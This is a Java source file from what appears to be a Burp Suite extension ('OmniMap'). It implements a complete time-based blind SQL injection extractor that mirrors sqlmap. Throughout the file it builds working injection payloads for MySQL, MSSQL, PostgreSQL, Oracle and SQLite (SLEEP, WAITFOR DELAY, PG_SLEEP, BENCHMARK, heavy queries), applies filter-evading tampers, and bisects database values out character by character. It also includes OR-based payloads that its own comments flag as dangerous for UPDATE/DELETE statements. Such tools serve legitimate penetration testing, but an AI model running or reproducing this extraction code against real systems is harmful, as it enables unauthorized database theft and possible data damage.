package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Time-based blind SQL injection extractor for OmniMap.
 * Same bisection algorithm as BlindExtractor but uses response timing
 * instead of content comparison.
 *
 * SPEED IMPROVEMENTS:
 * - Statistical validation: requires 2 consecutive timing confirmations
 *   to avoid network jitter false positives (reduces retries vs sqlmap)
 * - Adaptive delay: starts at configured delay, increases if server is slow
 * - Parallel extraction with careful thread management to avoid overwhelming the server
 */
public class TimeExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private final ResponseAnalyzer analyzer;
    private volatile boolean cancelled = false;

    /** Measured baseline response time (no delay) */
    private long baselineTimeMs = 0;

    /** Adaptive delay in seconds */
    private int currentDelay;

    /** Which payload type worked during detection (used for extraction) */
    private String workingPayloadType = "AND-sleep";

    /** The boundary (prefix/suffix) that works for time-based extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    public TimeExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                         OmniMapCallback callback, OmniMapResult result,
                         HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
        this.analyzer = new ResponseAnalyzer();
        this.currentDelay = config.getTimeDelay();

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Test if time-based injection works by trying ALL boundary × payload combinations.
     * Like sqlmap: each boundary is tried independently with each time payload.
     *
     * Level 1, Risk 1: Native sleep with AND
     * Level 2+: IF-direct, BENCHMARK for MySQL
     * Level 3+: ELT/MAKE_SET variants for MySQL
     * Risk 2: Heavy queries (BENCHMARK, GENERATE_SERIES, cross-join)
     * Risk 3: OR-based time payloads (dangerous for UPDATE/DELETE)
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if time-based injection is viable
     */
    public boolean detect(List<String[]> boundaries) {
        callback.onProgress("TIME: Measuring baseline response time...", 5);

        int level = config.getLevel();
        int risk = config.getRisk();

        // Measure baseline (normal request, no delay)
        long start = System.currentTimeMillis();
        var baseResp = sendPayloadRaw("");
        baselineTimeMs = System.currentTimeMillis() - start;
        if (baseResp == null || cancelled) return false;

        callback.onProgress("TIME: Baseline=" + baselineTimeMs + "ms. Testing delay...", 8);

        // Adapt delay if server is slow
        if (baselineTimeMs > 3000) {
            currentDelay = Math.max(currentDelay, (int) (baselineTimeMs / 1000) + 3);
        }

        // Build list of time payloads to try, gated by level and risk
        List<String[]> payloads = new ArrayList<>();

        // Level 1, Risk 1: native sleep with AND (always included)
        payloads.add(new String[]{buildSleepPayload("1=1"), "AND-sleep"});

        // Level 2+: MySQL — simpler direct IF sleep (no derived table)
        if (level >= 2 && "MySQL".equals(dialect.getName())) {
            int ri = java.util.concurrent.ThreadLocalRandom.current().nextInt(1000, 10000);
            payloads.add(new String[]{
                    " AND " + ri + "=" + dialect.ifFunction(
                            "1=1", dialect.sleepFunction(currentDelay), String.valueOf(ri)) + " ",
                    "AND-IF-direct"
            });
        }

        // Level 2+: MySQL BENCHMARK as time-based
        if (level >= 2 && "MySQL".equals(dialect.getName())) {
            payloads.add(new String[]{
                    " AND " + dialect.heavyQuery(currentDelay) + " ",
                    "AND-BENCHMARK"
            });
        }

        // Level 3+: MySQL ELT/MAKE_SET variants
        if (level >= 3 && "MySQL".equals(dialect.getName())) {
            payloads.add(new String[]{
                    " AND ELT(1=1," + dialect.sleepFunction(currentDelay) + ") ",
                    "AND-ELT-sleep"
            });
            payloads.add(new String[]{
                    " AND MAKE_SET(1=1," + dialect.sleepFunction(currentDelay) + ") ",
                    "AND-MAKE_SET-sleep"
            });
        }

        // Risk 2: heavy queries as alternative to native sleep
        if (risk >= 2) {
            payloads.add(new String[]{buildHeavyQueryPayload("1=1"), "AND-heavy-query"});
        }

        // Risk 3: OR-based time payloads (dangerous for UPDATE/DELETE!)
        if (risk >= 3) {
            payloads.add(new String[]{buildOrSleepPayload("1=1"), "OR-sleep"});
            payloads.add(new String[]{buildOrHeavyQueryPayload("1=1"), "OR-heavy-query"});
        }

        // Expand boundaries: for each boundary with non-empty suffix, also try without suffix.
        // Time payloads (SLEEP/WAITFOR/BENCHMARK) are self-contained — the delay completes
        // before the parser hits any trailing syntax issue. Doubles detection coverage.
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        int totalCombos = expandedBoundaries.size() * payloads.size();
        int tried = 0;

        // Try ALL boundary × payload combinations
        for (String[] boundary : expandedBoundaries) {
            String prefix = boundary[0];
            String suffix = boundary[1];

            for (String[] entry : payloads) {
                if (cancelled) return false;
                tried++;

                String payload = TamperEngine.apply(entry[0], config.getTampers());
                String label = entry[1];

                long responseTime = measureResponseTimeWith(payload, prefix, suffix);
                if (cancelled) return false;

                boolean delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
                if (!delayed) continue;

                // Statistical validation: confirm with a second test
                responseTime = measureResponseTimeWith(payload, prefix, suffix);
                delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);

                if (delayed) {
                    workingPayloadType = label;
                    workingPrefix = prefix;
                    workingSuffix = suffix;
                    callback.onProgress("TIME: Confirmed! " + label + " prefix=\"" + prefix +
                            "\" suffix=\"" + suffix + "\" delay=" + currentDelay +
                            "s [" + tried + "/" + totalCombos + "]", 10);
                    return true;
                }
            }
        }

        callback.onProgress("TIME: No delay detected after " + tried + " attempts", 0);
        return false;
    }

    /**
     * Extract a single string value using time-based blind bisection.
     * Uses fewer parallel threads than boolean blind (to avoid server overload).
     */
    public String extractSingle(String query) {
        if (cancelled) return null;

        // Step 1: Get string length
        int length = extractLength(query);
        if (length <= 0 || cancelled) return null;

        callback.onProgress("TIME: Extracting " + length + " chars...", 20);

        // Step 2: Extract characters SINGLE-THREADED for time-based.
        // Multi-threading is fundamentally unreliable for time-based blind because
        // concurrent SLEEP requests queue on the server — a thread testing a FALSE
        // condition sees high response time because it waits for another thread's
        // SLEEP to complete, causing false positives. sqlmap also uses single-threaded
        // extraction for time-based.
        int threads = 1;
        ExecutorService pool = Executors.newFixedThreadPool(threads);

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPosition(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                } else {
                    chars[charPos - 1] = '?';
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(120, TimeUnit.SECONDS); } catch (Exception e) { break; }
        }
        pool.shutdownNow();

        return new String(chars).trim();
    }

    /**
     * Extract a list of values.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
            callback.onProgress("TIME: Extracted " + results.size() + " values...",
                    Math.min(90, 20 + results.size() * 5));
        }

        return results;
    }

    /**
     * Extract string length using binary search with time-based detection.
     */
    private int extractLength(String query) {
        String lengthExpr = dialect.lengthFunction(query);
        int low = 0, high = 64;

        // Find upper bound
        while (!cancelled) {
            if (testTimedCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 1024) return -1;
            } else {
                break;
            }
        }

        // Binary search
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Critical for time-based: each wasted request costs N seconds of sleep delay.
     *
     * Tier 1: lowercase a-z (97-122) — log2(26) ≈ 5 steps + 1 range check = 6 requests
     * Tier 2: digits 0-9 (48-57)     — log2(10) ≈ 4 steps + 1 range check = 5 requests
     * Tier 3: full ASCII (32-126)     — log2(95) ≈ 7 steps, no range check  = 7 requests
     *
     * At a 5s delay, saving 1 request per char saves 5s per character extracted.
     */
    private int extractCharAtPosition(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters (most common in DB names/values)
        int result = bisectInRange(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRange(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFull(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    /**
     * Check if the ASCII value is within [low, high] and bisect if so.
     * Costs 1 timed request for the range check. Returns -1 if not in range.
     */
    private int bisectInRange(String asciiExpr, int low, int high) {
        if (!testTimedCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFull(asciiExpr, low, high);
    }

    /**
     * Binary search bisection using time-based detection.
     */
    private int bisectFull(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a condition using time-based injection.
     * Uses the payload type that was detected as working.
     * Returns true if the response is delayed.
     *
     * CRITICAL: must dispatch to the same payload family that worked during detection.
     * If BENCHMARK worked (SLEEP blocked), extraction must use BENCHMARK too.
     */
    private boolean testTimedCondition(String condition) {
        String payload;
        if (workingPayloadType.startsWith("OR-")) {
            if (workingPayloadType.contains("heavy") || workingPayloadType.contains("BENCHMARK")) {
                payload = buildOrHeavyQueryPayload(condition);
            } else {
                payload = buildOrSleepPayload(condition);
            }
        } else if (workingPayloadType.contains("heavy") || workingPayloadType.contains("BENCHMARK")) {
            // AND-heavy-query or AND-BENCHMARK: use heavy query (BENCHMARK/GENERATE_SERIES/cross-join)
            payload = buildHeavyQueryPayload(condition);
        } else if (workingPayloadType.contains("ELT")) {
            payload = " AND ELT(" + condition + "," + dialect.sleepFunction(currentDelay) + ") ";
        } else if (workingPayloadType.contains("MAKE_SET")) {
            payload = " AND MAKE_SET(" + condition + "," + dialect.sleepFunction(currentDelay) + ") ";
        } else {
            // AND-sleep, AND-IF-direct: use native sleep in subquery
            payload = buildSleepPayload(condition);
        }

        payload = TamperEngine.apply(payload, config.getTampers());
        long responseTime = measureResponseTime(payload);
        return analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
    }

    /**
     * Build AND-based native sleep payload — exact sqlmap format.
     *
     * MySQL detection:     AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
     * MySQL conditional:   AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
     * PostgreSQL detection: AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
     * PostgreSQL conditional: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)
     * MSSQL detection:     WAITFOR DELAY '0:0:[SLEEPTIME]'
     * MSSQL conditional:   IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
     * Oracle detection:    AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
     * Oracle conditional:  AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)
     * SQLite detection:    AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
     * SQLite conditional:  AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN LIKE(...) ELSE [RANDNUM] END)
     */
    private String buildSleepPayload(String condition) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);
        String dbms = dialect.getName();

        if ("MySQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                // sqlmap: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
                return " AND (SELECT " + ri + " FROM (SELECT(" + dialect.sleepFunction(currentDelay) + "))" + rs + ") ";
            } else {
                // sqlmap: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
                return " AND (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + "-(IF((" + condition + "),0," + currentDelay + ")))))" + rs + ") ";
            }
        } else if ("MSSQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                // sqlmap: WAITFOR DELAY '0:0:[SLEEPTIME]'
                return " WAITFOR DELAY '0:0:" + currentDelay + "' ";
            } else {
                // sqlmap: IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
                return " IF((" + condition + ")) WAITFOR DELAY '0:0:" + currentDelay + "' ";
            }
        } else if ("PostgreSQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                // sqlmap: AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
                return " AND " + ri + "=(SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ";
            } else {
                // sqlmap: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)
                return " AND " + ri + "=(CASE WHEN (" + condition + ") THEN (SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ELSE " + ri + " END) ";
            }
        } else if ("Oracle".equals(dbms)) {
            if ("1=1".equals(condition)) {
                // sqlmap: AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
                return " AND " + ri + "=" + dialect.sleepFunction(currentDelay) + " ";
            } else {
                // sqlmap: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)
                return " AND " + ri + "=(CASE WHEN (" + condition + ") THEN " + dialect.sleepFunction(currentDelay) + " ELSE " + ri + " END) ";
            }
        } else {
            // SQLite and others: CASE WHEN pattern
            if ("1=1".equals(condition)) {
                return " AND " + ri + "=" + dialect.sleepFunction(currentDelay) + " ";
            } else {
                return " AND " + ri + "=(CASE WHEN (" + condition + ") THEN " + dialect.sleepFunction(currentDelay) + " ELSE " + ri + " END) ";
            }
        }
    }

    /**
     * Build AND-based heavy query payload (risk 2+) — exact sqlmap format.
     *
     * MySQL:      AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
     * PostgreSQL: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)
     * MSSQL:      AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS t1,...,t7) ELSE [RANDNUM] END)
     * Oracle:     AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS t1,...,t5) ELSE [RANDNUM] END)
     * SQLite:     AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(...))))) ELSE [RANDNUM] END)
     */
    private String buildHeavyQueryPayload(String condition) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);

        if ("MySQL".equals(dialect.getName())) {
            if ("1=1".equals(condition)) {
                return " AND " + ri + "=" + dialect.heavyQuery(currentDelay) + " ";
            } else {
                // sqlmap: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK(...),[RANDNUM])
                return " AND " + ri + "=IF((" + condition + ")," + dialect.heavyQuery(currentDelay) + "," + ri + ") ";
            }
        } else {
            if ("1=1".equals(condition)) {
                return " AND " + ri + "=" + dialect.heavyQuery(currentDelay) + " ";
            } else {
                // CASE WHEN pattern for non-MySQL
                return " AND " + ri + "=(CASE WHEN (" + condition + ") THEN " + dialect.heavyQuery(currentDelay) + " ELSE " + ri + " END) ";
            }
        }
    }

    /**
     * Build OR-based native sleep payload (risk 3) — exact sqlmap format.
     * Dangerous for UPDATE/DELETE queries!
     */
    private String buildOrSleepPayload(String condition) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        String rs = "a" + ThreadLocalRandom.current().nextInt(1000, 10000);
        String dbms = dialect.getName();

        if ("MySQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                return " OR (SELECT " + ri + " FROM (SELECT(" + dialect.sleepFunction(currentDelay) + "))" + rs + ") ";
            } else {
                return " OR (SELECT " + ri + " FROM (SELECT(SLEEP(" + currentDelay + "-(IF((" + condition + "),0," + currentDelay + ")))))" + rs + ") ";
            }
        } else if ("MSSQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                return " WAITFOR DELAY '0:0:" + currentDelay + "' ";
            } else {
                return " IF((" + condition + ")) WAITFOR DELAY '0:0:" + currentDelay + "' ";
            }
        } else if ("PostgreSQL".equals(dbms)) {
            if ("1=1".equals(condition)) {
                return " OR " + ri + "=(SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ";
            } else {
                return " OR " + ri + "=(CASE WHEN (" + condition + ") THEN (SELECT " + ri + " FROM PG_SLEEP(" + currentDelay + ")) ELSE " + ri + " END) ";
            }
        } else {
            // Oracle, SQLite, others
            if ("1=1".equals(condition)) {
                return " OR " + ri + "=" + dialect.sleepFunction(currentDelay) + " ";
            } else {
                return " OR " + ri + "=(CASE WHEN (" + condition + ") THEN " + dialect.sleepFunction(currentDelay) + " ELSE " + ri + " END) ";
            }
        }
    }

    /**
     * Build OR-based heavy query payload (risk 3) — exact sqlmap format.
     */
    private String buildOrHeavyQueryPayload(String condition) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);

        if ("MySQL".equals(dialect.getName())) {
            if ("1=1".equals(condition)) {
                return " OR " + ri + "=" + dialect.heavyQuery(currentDelay) + " ";
            } else {
                return " OR " + ri + "=IF((" + condition + ")," + dialect.heavyQuery(currentDelay) + "," + ri + ") ";
            }
        } else {
            if ("1=1".equals(condition)) {
                return " OR " + ri + "=" + dialect.heavyQuery(currentDelay) + " ";
            } else {
                return " OR " + ri + "=(CASE WHEN (" + condition + ") THEN " + dialect.heavyQuery(currentDelay) + " ELSE " + ri + " END) ";
            }
        }
    }

    /**
     * Measure response time for a payload using the stored working boundary.
     * Used during extraction phase.
     */
    private long measureResponseTime(String payload) {
        long start = System.currentTimeMillis();
        sendPayload(payload);
        return System.currentTimeMillis() - start;
    }

    /**
     * Measure response time for a payload using a specific boundary.
     * Used during detection phase to try different prefix/suffix combinations.
     */
    private long measureResponseTimeWith(String payload, String prefix, String suffix) {
        long start = System.currentTimeMillis();
        sendPayloadWith(payload, prefix, suffix);
        return System.currentTimeMillis() - start;
    }

    /**
     * Send payload using the stored working boundary.
     * Used during extraction phase.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    /**
     * Send payload using a specific boundary.
     * Used during detection phase.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    prefix + payload + (suffix.isEmpty() ? "" : suffix));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "TIME", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send raw payload without tracking (for baseline measurement).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadRaw(String payload) {
        try {
            HttpRequest req = payload.isEmpty() ? originalRequest.request()
                    : PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), payload);
            HttpRequestResponse rr = api.http().sendRequest(req);
            result.incrementRequestCount();
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

}
